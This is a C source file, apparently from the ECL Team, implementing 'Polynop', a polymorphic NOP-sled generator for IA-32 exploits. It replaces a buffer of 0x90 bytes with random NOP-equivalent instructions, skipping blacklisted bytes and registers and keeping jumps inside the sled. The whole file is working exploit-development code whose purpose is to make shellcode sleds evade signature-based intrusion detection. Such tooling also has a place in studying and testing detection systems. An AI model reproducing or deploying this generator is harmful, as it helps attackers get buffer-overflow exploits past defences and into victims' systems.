/*
 *  Yuri Gushin - <yuri@ecl-labs.org>
 *  ECL Team
 *  
 *  Polynop in the works!
 */

#define VERSION "1.0"

#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stdio.h>
#include "polynopeng.h"


void mark_bad_nops(char *badchars, char *badregs);
int inject_nop(char *buffer, struct IA32_nop NOP, int boundary, struct IA32_nop min_jmp);
struct IA32_nop smallest_nop(void);
int usable_length(char *buffer);


void polynopad(char *sled, char *badchars, char *badregs)
{
  int r,len,next,i = 0;
  struct IA32_nop min_jmp;

  srand( (int)time(0) );
  len = usable_length(sled);		// calculate how much nop space we have
  mark_bad_nops(badchars, badregs);	// mark the bad nops before continuing
  min_jmp = smallest_nop();     	// used with JMP family sanity checks

  while ( i<len )
    {
      next = 0;
      r = rand() % (sizeof(IA32_nops)/sizeof(struct IA32_nop));

      if ((IA32_nops[r].bad) || (IA32_nops[r].bytes > (len - i)))
	next = 0;
      else
	next = inject_nop(&sled[i], IA32_nops[r], (len - i), min_jmp);

      i+= next;
    }

#ifdef DEBUG
  printf("Polymorphic nop-sled generated succesfully.\n\n");
#endif

}

// mark bad nops (by byte or which register they affect)
void mark_bad_nops(char *badchars, char *badregs)
{
  int i, sanity, bad = 0;
  char *tmp1, *tmp2;

  sanity = 0; // lets make sure have have at least one single-byte nop

  for (i=0; i<((sizeof(IA32_nops)/sizeof(struct IA32_nop))); i++)
    {

      if (badchars && strlen(badchars)>0)
	{
	  if (strchr(badchars, IA32_nops[i].code))
	    IA32_nops[i].bad = 1;
	}
      else
	IA32_nops[i].bad = 0;
      
      if ((!IA32_nops[i].bad) && (badregs) && (strlen(badregs)>2))
	{
	  tmp1 = strdup(badregs);
	  while ((tmp2 = strsep(&tmp1, ",")) != NULL)
	    if (strcasestr(IA32_nops[i].affect, tmp2))
	      IA32_nops[i].bad = 1;
	}

      if (IA32_nops[i].bad) bad++;
      if ((!IA32_nops[i].bad)&&(IA32_nops[i].bytes == 1)) sanity = 1;
   }

#ifdef DEBUG
  printf("\nPolynop v%s at your service!\n", VERSION);
  printf("Available nop pool size: %d\n", sizeof(IA32_nops)/sizeof(struct IA32_nop) - bad);
  printf("Blacklists:\n  Characters:");
  for (i=0; i<strlen(badchars); i++)
    printf(" 0x%.2x", badchars[i] & 0xff);
  printf("\n  Registers: %s\n", badregs);
#endif

  // sanity checks
  if (sizeof(IA32_nops)/sizeof(struct IA32_nop) - bad <30)
    fprintf(stderr, "Polynop warning: only %d nops are being used\n",
            (sizeof(IA32_nops)/sizeof(struct IA32_nop) - bad));

  if (!sanity)
    {
      fprintf(stderr, "Polynop error: infinite loop condition -"
	      "check bad characters/registers settings\n");
      exit(-1);
    }
}

/*
  This will inject the nop along with it's arguments recuresively.
  In the case of a JMP family nop checks are made so it won't jump over the sled.
  Returns number of written bytes, 0 if failed.
*/
int inject_nop(char *buffer, struct IA32_nop NOP, int boundary, struct IA32_nop min_jmp)
{
  int r,i,tmp;

  tmp = 0;
  i = 1;
  // instruction not from the JMP family
  if (!strstr(NOP.affect, "EIP"))
    {
      buffer[0] = NOP.code;
      while ( i < NOP.bytes )
	{
	  r = rand() % (sizeof(IA32_nops)/sizeof(struct IA32_nop));
	  while (IA32_nops[r].bad || IA32_nops[r].bytes>(boundary-i))
	    r = rand() % (sizeof(IA32_nops)/sizeof(struct IA32_nop));
	  tmp = inject_nop(&buffer[i], IA32_nops[r], boundary-i, min_jmp);
	  i += tmp;
	}
      return i;
    }
  else
    // checking if the randomly generated argument won't jump out of the sled
    // we also check for negative jumps
    if ( min_jmp.code<=(boundary-2) && min_jmp.bytes<=(boundary-1))
      {
        buffer[0] = NOP.code;
	r = rand() % (sizeof(IA32_nops)/sizeof(struct IA32_nop));
	while ( IA32_nops[r].code>(boundary-2) || IA32_nops[r].bytes>(boundary-2)
		|| IA32_nops[r].code<0 || IA32_nops[r].bad)
	  r = rand() % (sizeof(IA32_nops)/sizeof(struct IA32_nop));
	tmp = inject_nop(&buffer[1], IA32_nops[r], boundary-1, min_jmp);
	return tmp+1;
      }
    else
      return 0;
}

/*
This one exists for the sole purpose of finding smallest positive nop from the nop list
(for the JMP family argument sanity checks)
*/
struct IA32_nop smallest_nop(void)
{
  int i = 0;
  struct IA32_nop min;

  min = IA32_nops[0];

  while (IA32_nops[i].bad)
    min = IA32_nops[++i];

  for ( ++i; i<((sizeof(IA32_nops)/sizeof(struct IA32_nop))); i++ )
    if ( (IA32_nops[i].code>0) && (IA32_nops[i].code<min.code) && (!IA32_nops[i].bad) )
      min = IA32_nops[i];

  return min;
}

int usable_length(char *buffer) 
{
  int c = 0;

  while (buffer[c] == '\x90')
    c++;

  return c;
}
